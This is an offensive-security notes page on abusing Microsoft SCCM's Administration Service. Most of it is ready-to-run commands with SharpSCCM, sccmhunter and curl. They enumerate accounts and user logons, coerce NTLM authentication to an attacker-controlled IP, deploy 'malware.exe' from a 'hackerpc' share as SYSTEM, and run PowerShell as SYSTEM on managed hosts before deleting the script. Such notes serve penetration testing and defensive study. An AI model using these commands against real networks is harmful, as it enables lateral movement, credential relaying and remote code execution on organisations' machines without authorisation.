---
title: SCCM Admin
---

The [[notes/ad/sccm]] Administration Service is a REST API that exposes all features of SCCM over HTTP(S).

List accounts used by SCCM.

=== "[[notes/tools/sharpsccm]]"
    ~~~ bat
    .\SharpSCCM.exe get class-instances SMS_Admin
    .\SharpSCCM.exe get class-instances SMS_SCI_Reserved
    ~~~

Find computers where a specific user was logged on.

=== "[[notes/tools/sccmhunter]]"
    ~~~
    ❯ sccmhunter admin -debug -u sccmadm -p 'passw0rd' -ip sccmss01.corp.local
    () (\) >> get lastlogon jdoeadm
    ~~~

=== "[[notes/tools/sharpsccm]]"
    ~~~ bat
    .\SharpSCCM.exe get primary-users -u jdoeadm
    .\SharpSCCM.exe get devices -p LastLogonTimestamp -p LastLogonUserName -p NetbiosName -u jdoeadm
    ~~~

Retrieve recent logon events from all clients.

=== "[[notes/tools/sharpsccm]]"
    ~~~ bat
    .\SharpSCCM.exe invoke admin-service -i SMS00001 -q "EventLog('Security',8h) | where EventID == 4624 | order by DateTime desc" -j
    ~~~

Deploy an application to [[notes/ad/ntlm-relay-from-smb|coerce NTLM authentication via SMB]] from the primary user of a given computer ([source](http://web.archive.org/web/20221122215934/https://scribe.rip/@specterops/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)).
This can take several minutes.

=== "[[notes/tools/sharpsccm]]"
    ~~~ bat
    .\SharpSCCM.exe exec -d ws01 -r 192.168.57.130
    ~~~

Deploy an application to execute a binary from a SMB share in system context on a SCCM-managed computer.

=== "[[notes/tools/sharpsccm]]"
    ~~~ bat
    .\SharpSCCM.exe exec -d ws01 -p \\hackerpc.corp.local\share\malware.exe --run-as-system
    ~~~

Execute a PowerShell script as system on a SCCM-managed computer without an application deployment.

=== "[[notes/tools/sccmhunter]]"
    ~~~
    ❯ sccmhunter show -smb
    ...
    |    | Hostname            | Site Code | Signing Status | Site Server | Distribution Point | WSUS  | MSSQL |
    ...
    |  1 | sccmss01.corp.local | CRP       | False          | True        | True               | False | False |
    ...
    ❯ echo 'whoami /all' > ./test.ps1
    ❯ sccmhunter admin -debug -u sccmadm -p 'passw0rd' -ip sccmss01.corp.local
    () (\) >> get device ws01
    ...
    Name: ws01
    ResourceId: 12345678
    ...
    () (\) >> interact 12345678
    (12345678) (\) >> script ./test.ps1
    ...
    Benutzername        SID
    =================== ========
    nt-authority\\system S-1-5-18
    ...
    ~~~

=== "[[notes/tools/prox-ez]] + curl"
    Start a HTTP proxy to handle Kerberos authentication.

    ~~~ bash
    prox-ez -p 1080 -dc corp.local/sccmadm:'passw0rd' -k
    ~~~

    Send the requests to execute the script and retrieve its output.

    ~~~ bash
    proxy='http://localhost:1080'
    endpoint='https://sccmss01.corp.local/AdminService'
    hostname='ws01'
    guid="$(uuidgen -r)"
    device="$(curl -sS -k -x "$proxy" -H 'Content-Type: application/json' "$endpoint/v1.0/Device" -G --data-urlencode "\$filter=Name eq '$hostname'" | jq -r '.value[].MachineId')"
    jq -n --arg code "$(cat ./test.ps1 | base64 -w0)" --arg guid "$guid" '{"Script":$code,"ScriptGuid":$guid,"ScriptName":"ConfigMgrTemp","ScriptVersion":"1"}' | curl -sS -k -x "$proxy" -H 'Content-Type: application/json' "$endpoint/wmi/SMS_Scripts.CreateScripts" -d @- | jq -r .ReturnValue
    curl -sS -k -x "$proxy" -H 'Content-Type: application/json' "$endpoint/wmi/SMS_Scripts/$guid/AdminService.UpdateApprovalState" -d '{"ApprovalState":"3"}' | jq -r .ReturnValue
    operation="$(jq -n --arg guid "$guid" '{"ScriptGuid":$guid}' | curl -sS -k -x "$proxy" -H 'Content-Type: application/json' "$endpoint/v1.0/Device($device)/AdminService.RunScript" -d @- | jq -r .value)"
    curl -sS -k -x "$proxy" -H 'Content-Type: application/json' "$endpoint/v1.0/Device($device)/AdminService.ScriptResult(OperationId=$operation)" | jq -r '.value.Result[].ScriptOutput'
    curl -sS -k -x "$proxy" -H 'Content-Type: application/json' "$endpoint/wmi/SMS_Scripts('$guid')" -X DELETE
    ~~~

Other tools:

- [MalSCCM](https://labs.nettitude.com/blog/introducing-malsccm/)
- [ConfigMgr.AdminService](https://github.com/AdamGrossTX/ConfigMgr.AdminService/), PowerShell scripts for interacting with the REST API

References:

- [SCCM Hierarchy Takeover](http://web.archive.org/web/20240305225949/https://scribe.rip/@specterops/posts.specterops.io/sccm-hierarchy-takeover-41929c61e087), there is no security boundary between SCCM sites in the same hierarchy
- [Lateral Movement without Lateral Movement (Brought to you by ConfigMgr)](http://web.archive.org/web/20230809074353/https://scribe.rip/@dlomellini/lateral-movement-without-lateral-movement-brought-to-you-by-configmgr-9b79b04634c7), abusing CMPivot
